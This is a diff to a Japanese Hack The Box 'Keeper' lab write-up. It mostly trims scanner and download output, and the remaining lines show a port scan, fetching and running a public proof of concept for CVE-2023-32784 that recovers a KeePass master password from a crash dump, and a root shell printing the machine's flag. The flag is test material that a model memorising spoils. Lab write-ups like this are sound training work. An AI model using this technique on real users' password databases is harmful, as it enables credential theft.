@@ -2,19 +2,7 @@ https://app.hackthebox.com/machines/Keeper
 
 ## STEP 1
 ```sh
-└─$ rustscan -a 10.129.190.164 --scripts none
-.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
-| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
-| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
-`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
-The Modern Day Port Scanner.
-________________________________________
-: http://discord.skerritt.blog         :
-: https://github.com/RustScan/RustScan :
- --------------------------------------
-RustScan: Where '404 Not Found' meets '200 OK'.
-
-[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+└─$ rustscan -a 10.129.190.164 --no-banner --scripts none
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.129.190.164:22
@@ -112,17 +100,8 @@ Session completed.
 ここでkeepassには、CVE-2023-32784が存在しクラッシュダンプからパスワードを復元できる脆弱性があるらしい  
 PoCを試してみると文字列は抽出できたが、何文字が欠落しているっぽい
 ```sh
-└─$ wget https://raw.githubusercontent.com/z-jxy/keepass_dump/refs/heads/main/keepass_dump.py
+└─$ wget -nv https://raw.githubusercontent.com/z-jxy/keepass_dump/refs/heads/main/keepass_dump.py
 --2025-07-12 10:30:42--  https://raw.githubusercontent.com/z-jxy/keepass_dump/refs/heads/main/keepass_dump.py
-Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...
-Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 14948 (15K) [text/plain]
-Saving to: ‘keepass_dump.py’
-
-keepass_dump.py                                            100%[========================================================================================================================================>]  14.60K  --.-KB/s    in 0s      
-
-2025-07-12 10:30:43 (77.3 MB/s) - ‘keepass_dump.py’ saved [14948/14948]
 
 └─$ python3.13 keepass_dump.py -f KeePassDumpFull.dmp 
 [*] Searching for masterkey characters
@@ -194,3 +173,4 @@ You have new mail.
 Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
 root@keeper:~# cat root.txt
 dd05820dc970d89af4d2893b0b9a3027
+```
